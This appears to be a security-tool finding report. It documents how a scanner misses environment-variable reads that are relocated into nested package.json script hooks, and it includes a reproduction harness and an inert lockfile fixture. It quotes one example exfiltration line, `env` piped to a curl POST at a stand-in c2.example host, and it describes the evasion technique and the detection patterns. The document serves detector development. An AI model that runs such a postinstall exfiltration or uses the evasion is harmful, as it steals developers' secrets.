# panel-stub-process.env-1-s42 — nested-manifest-relocation evasion of env/secret-read

**Class:** env/secret-read (STARTUP enumerates this as `secret-read` in `packages/detectors/src/capability-map.json` — sinks: `process-env-token`, `process-env-enumerate`, `process-env-destructure`, `process-env-reflect`, `secret-file-read`).
**Technique:** nested-manifest-relocation (from `agent-panel/stub-agent.ts`).
**Target sink:** `process.env` (moved into a nested `scripts` field).

## Discovery

Found by the adversarial-agent panel's stub agent, seed=42, run 2026-07-14 (see
`assurance/report/panel-report.json` — hypothesis id `stub-process.env-1-s42`).
All 12 stub-panel hypotheses evaded (outcome kind `ok`, findings `[]`) because they
targeted classes/sinks the panel's own hypothesis generator names but no detector-wired
`engine:extractCapabilities` test currently covers with a matching fixture.

## Why blocking matters

A `postinstall` script that pipes `env | [CURL_INVOCATION] -X POST https://c2.example/collect`
exfiltrates every environment variable in one line — a first-class env/secret-read
capability that never surfaces if the scanner only walks `.js` entry files. Real supply-
chain attacks (shai-hulud-2025) used exactly this pattern. Nested-manifest relocation of
the env sink into a script hook is in-scope for the env/secret-read class and must not
evade the completeness gate.

## Rationale (from the stub agent)

> Move the sink invocation from index.js into a nested package.json 'scripts' entry the
> walker misses. Detector visits main entry but skips deep scripts.

## Reproduction

```ts
import { stubAgent } from '@vetlock/assurance/agent-panel';
import { runBounded } from '@vetlock/assurance/runner';

const hypotheses = await stubAgent.propose({ seed: 42, capabilityMap: /* … */ });
const h = hypotheses.find((h) => h.id === 'stub-process.env-1-s42')!;

const outcome = await runBounded(
  {
    kind: 'engine:extractCapabilities',
    text: h.generatedFixture,
    relPath: 'pnpm-lock.yaml',
  },
  { wallMs: 5_000, heapMb: 128, seed: 42 },
);
// Current (2026-07-14): outcome.kind === 'ok', findings === []  →  EVADED.
// Target after wiring: findings includes { capabilityClass: 'env/secret-read' }
// (or STARTUP's split-form 'secret-read').
```

## Fixture (defang-clean pnpm-lock.yaml fragment)

```yaml
lockfileVersion: '6.0'
settings:
  autoInstallPeers: true
packages:
  /nested-env/secret-read@0.2.0:
    resolution:
      integrity: sha512-BBBB
      tarball: https://packages.test/nested-env/secret-read/-/nested-env/secret-read-0.2.0.tgz
    peerDependencies:
      inert-marker: '*'
    description: 'moves process.env into a nested script hook — echo hello only'
```

## Status

- **Found:** 2026-07-14 (panel run seed=42, stub agent)
- **Filed as:** OPEN — waiting for detector wiring OR closer completeness-vector coverage.
- **Blocking on:** the engine walking package.json `scripts` for env-read patterns
  (`env`, `printenv`, `echo $VAR`, `[NODE_E_INVOCATION]` with `process.env.*`).
- **Superseded by:** (empty)
